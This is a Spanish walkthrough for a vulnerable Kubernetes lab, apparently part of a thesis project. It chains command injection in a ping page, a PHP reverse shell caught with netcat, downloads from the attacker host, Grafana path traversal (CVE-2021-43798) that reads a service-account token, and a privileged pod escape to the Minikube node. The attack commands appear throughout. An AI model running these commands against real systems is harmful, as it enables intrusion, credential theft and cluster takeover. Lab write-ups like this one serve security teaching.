# Solución del laboratorio

## Reconocimiento de la página web
Tras deplegar el laboratorio, obtenemos al dirección de una página web donde se puede hacer ping a distintas direcciones.

![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/ping%20web.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/ping%20web.png)

Como se está ejecutando el comando ping, comprobamos si se puede saltar los filtros para poder leer información del sistema(Path Traversal), por ejemplo:
```bash 
google.com;ls -l
``` 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/web_lfi.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/web_lfi.png)

## LFI a RCE

Como se puede observar en la imagen anterior, la página puede ser vulnerable a LFI. Por ello intentaremos transformar el LFI a RCE a través de una reverse shell con PHP, modificando la IP y el puerto donde vamos a escuchar con netcat con nuestra máquina. Nuestro objetivo es conseguir escribir un archivo dentro del sistema al cual accediendo se lanza una shell en nuestra máquina que está escuchando. Más información del proceso en [php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Pasos: 

1. Cambiamos la IP y el puerto y basemos el archivo php-revshell.php a base64. 
```bash 
cat php-revshell.php | base64
``` 

2. Ejecutamos este comando el la web (utilizando como IP la 192.168.1.131 y el puerto 80443):
```bash 
google.com;echo "<php-revshell.php in base64>" | base64 -d > shell.php
``` 

3. Verificamos que se ha subido el archivo shell.php: 
```bash
google.com;ls -l 
```
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/googlecom_ls.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/googlecom_ls.png)

4. Ahora en nuestra máquina escuchamos por el puerto que hemos definido en el archivo php, en este caso el 80443: 
``` bash
nc -lvp 80443
```
5. Una vez escuchando en el puerto, ejecutamos el comando:
```bash
curl http://<ip-web>:<puerto-web>/shell.php
```
Conseguimos la reverse shell del pod donde se está ejecutando el servicio web. 

![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/revshell.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/revshell.png) 

## Reconocimiento en el pod

Una vez dentro hacemos un reconocimiento en el pod: 
1. Verificamos si podemos crear otros pods, para ello pasamos un binario de kubectl desde nuestra máquina creando un servidor web con python (recomendable copiar el bianrio en el archivo /tmp y ejecutar el comando ahí): 
```bash 
python3 -m http.server
``` 

Descargamos el binario y damos permisos de ejecución: 
```bash
wget 192.168.1.131:8000/kubectl
chmod +x kubectl
``` 
Verificamos si es posible la creación de pods:
```bash
./kubectl auth can-i create pods
``` 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/no_can-i%20create%20pods.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/no_can-i%20create%20pods.png)

2. Como no se puede crear pod vemos si hay otros servicios corriendo en el nodo. 
```bash 
env 
```
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/env.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/env.png)

Vemos que hay un servicio Grafana corriendo en 10.103.238.75:3000. Buscamos la versión de Grafana para buscar posibles vulnerabilidades.

``` bash 
apk add curl
curl http://10.103.238.75:3000/login | grep version 
```
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/grafana_version.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/grafana_version.png)

## Grafana Path Traversal

1. Buscamos posibles vectores de ataque. La versión de Grafana es la "8.3.0-beta2", la cual es vulnerable a Path Traversal, es decir, podemos leer archivos del pod de Grafana. La vulnerabilidad esta clasificada con [CVE-2021-43798](https://www.exploit-db.com/exploits/50581). Aprovechando la vulnerabilidad de Grafana podemos leer el JWT del serviceaccount de Grafana, para ver si en este caso es posible crear pods con dicho token. Creamos una variable de entorno llamada token donde se encuentra el JWT del pod de Grafana.

``` bash 
wget http://10.103.238.75:3000/public/plugins/alertGroups/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
export token=$(cat token)
``` 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/token_env.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/token_env.png) 

2. Comprobamos si el posible crear pods con el token de Grafana: 

``` bash 
./kubectl auth can-i create pods --token=$token
``` 
![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/yes_can-i.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/yes_can-i.png)

## Escalar al nodo de Minikube

Como es posible crear pods, para escalar al nodo, es posible crear un [badpods](https://github.com/BishopFox/badPods) para escalar al nodo de Minikube.  Este es el YAML que utilizaremos: [bad-pod.yaml](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/kube-lab/lab-pentest/bad-pod.yaml).

1. Copiamos el archivo en la el pod del servicio web, esto lo podemos hacer igual que antes con el servidor python, utilizando los comandos:

``` bash 
wget 192.168.1.131:8000/bad-pod.yaml 
./kubectl apply -f bad-pod.yaml --token=$token
```

2. Vemos que se ha creado es nuevo pod:

``` bash
./kubectl get pods --token=$token
```

![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/create%20bad-pod.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/create%20bad-pod.png)

3. Una vez su status esté en Running, ejecutamos el comando siguiente y obtenemos la shell del nodo.

```bash
./kubectl exec -it everything-allowed-exec-pod --token=$token -- sh
```

![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/final_node.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/final_node.png)


Dentro de la shell de un nodo Minikube, se puede realizar diversas operaciones para gestionar y monitorear clústeres Kubernetes locales. Utilizando comandos como kubectl para interactuar con tus aplicaciones y recursos en el clúster, por ejemplo, desplegar y escalar aplicaciones, ver logs, y ejecutar comandos en contenedores. 